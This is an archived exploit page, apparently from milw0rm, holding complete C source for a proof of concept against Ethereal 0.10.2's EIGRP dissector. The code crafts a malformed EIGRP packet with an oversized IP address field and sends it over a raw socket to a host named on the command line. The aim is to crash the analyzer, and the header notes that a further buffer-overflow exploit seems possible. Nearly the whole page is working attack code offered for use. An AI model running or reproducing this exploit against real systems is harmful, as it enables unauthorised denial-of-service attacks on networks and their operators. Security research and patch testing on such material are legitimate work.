<html>
<head>
<title>Ethereal EIGRP Dissector TLV_IP_INT Long IP Remote DoS Exploit
</title>
</head>
<pre>
/*
 * Ethereal network protocol analyzer
 * EIGRP Dissector TLV_IP_INT Long IP Address Overflow
 * vulnerability
 * proof of concept code
 * version 1.0 (Mar 26 2004)
 *
 * by Rémi Denis-Courmont &lt; ethereal at simphalampin dot com &gt;
 *   www simphalempin com dev 
 *
 * This vulnerability was found by:
 *   Stefan Esser s.esser e-matters de
 * whose original advisory may be fetched from:
 *   security e-matters de advisories 032004.html
 *
 * Vulnerable:
 *  - Ethereal v0.10.2
 *
 * Not vulnerable:
 *  - Ethreal v0.10.3
 *
 * Note: this code will simply trigger a denial of service on Ethereal.
 * It should really be possible to exploit the buffer overflow
 * (apparently up to 29 bytes overflow), but I haven't tried.
 */


#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netdb.h&gt;

static const char packet[] =
        &quot;\x01&quot; /* Version */
        &quot;\x04&quot; /* Opcode: Reply */
        &quot;\x00\x00&quot; /* Checksum (invalid) */
        &quot;\x00\x00\x00\x00&quot; /* Flags */
        &quot;\x00\x00\x00\x00&quot; /* Sequence number */
        &quot;\x00\x00\x00\x00&quot; /* ACK */
        &quot;\x00\x00\x00\x00&quot; /* AS number */

        /* IP internal routes TLV */
        &quot;\x01\x02&quot; /* Type */
        &quot;\x00\x39&quot; /* Length (should be 0x1C) */
        &quot;\x00\x00\x00\x00&quot; /* Next hop */
        &quot;\x00\x00\x00\x00&quot; /* Delay */
        &quot;\x00\x00\x00\x00&quot; /* Bandwitdh */
        &quot;\x00\x00\x00&quot; /* MTU */
        &quot;\x00&quot; /* Hop count: directly connected */
        &quot;\xff&quot; /* Reliability: maximum */
        &quot;\x01&quot; /* Load: minimum */
        &quot;\x00\x00&quot; /* Reserved */
        &quot;\xff&quot; /* Prefix length: should be &gt; 0 and &lt;= 32 */
        &quot;\x00\x00\x00&quot; /* Destination network */
        &quot;\xff\xff\xff\xff&quot; &quot;\xff\xff\xff\xff&quot;
        &quot;\xff\xff\xff\xff&quot; &quot;\xff\xff\xff\xff&quot;
        &quot;\xff\xff\xff\xff&quot; &quot;\xff\xff\xff\xff&quot;
        &quot;\xff\xff\xff\xff&quot; &quot;\xff&quot; /* buffer overflow */
;


static int
proof (const struct sockaddr_in *dest)
{
        int fd;
        size_t len;

        fd = socket (PF_INET, SOCK_RAW, 88);
        if (fd == -1)
        {
                perror (&quot;Raw socket error&quot;);
                return 1;
        }

        len = sizeof (packet) - 1;
        if (sendto (fd, packet, len, 0, (const struct sockaddr *)dest,
                        sizeof (struct sockaddr_in)) != len)
        {
                perror (&quot;Packet sending error&quot;);
                close (fd);
                return 1;
        }

        puts (&quot;Packet sent!&quot;);
        close (fd);
        return 0;
}


static int
usage (const char *path)
{
        fprintf (stderr, &quot;Usage: %s &lt;hostname/IP&gt;\n&quot;, path);
        return 2;
}


int
main (int argc, char *argv[])
{
        struct sockaddr *dest;

        puts (&quot;Ethereal EIGRP Dissector TLV_IP_INT Long IP Address Overflow\n&quot;
                &quot;proof of concept code\n&quot;
                &quot;Copyright (C) 2004 R&lt;E9&gt;mi Denis-Courmont &quot;
                &quot;&lt;\x65\x74\x68\x65\x72\x65\x61\x6c\x40\x73\x69\x6d\x70&quot;
                &quot;\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d&gt;\n&quot;);


        if (argc != 2)
                return usage (argv[0]);
        else
        {
                struct addrinfo help, *res;
                int check;

                memset (&amp;help, 0, sizeof (help));
                help.ai_family = PF_INET;

                check = getaddrinfo (argv[1], NULL, &amp;help, &amp;res);
                if (check)
                {
                        fprintf (stderr, &quot;%s: %s\n&quot;, argv[1],
                                        gai_strerror (check));
                        return 1;
                }

                dest = res-&gt;ai_addr;
        }

        return proof ((const struct sockaddr_in *)dest);
}

// milw0rm.com [2004-04-04]
</pre>
</html>

